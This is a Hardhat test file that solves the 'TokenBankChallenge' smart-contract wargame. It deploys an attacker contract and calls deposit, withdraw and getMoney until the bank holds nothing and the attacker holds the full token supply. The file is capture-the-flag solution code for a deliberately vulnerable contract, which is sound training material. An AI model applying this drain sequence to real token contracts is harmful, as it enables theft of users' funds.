import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
    ]);

    target = await targetFactory.deploy(attacker.address);
    await target.deployed();

    const tokenAddress = await target.token();
    token = await tokenFactory.attach(tokenAddress);
    await token.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);
  });

  it('exploit', async () => {
    const attackFactory = await ethers.getContractFactory("TokenBankAttacker");
    const attackContract = await attackFactory.deploy(target.address, token.address);
    attackContract.attach(attacker.address);
    await attackContract.deployed();
    
    const tokens = ethers.BigNumber.from(10).pow(18).mul(500_000);

    await target.withdraw(tokens);
    await token["transfer(address,uint256)"](attackContract.address, tokens);
    await attackContract.deposit();
    await attackContract.withdraw();
    await attackContract.getMoney(attacker.address);

    expect(await token.balanceOf(target.address)).to.equal(0);
    expect(await token.balanceOf(attacker.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );
  });
});
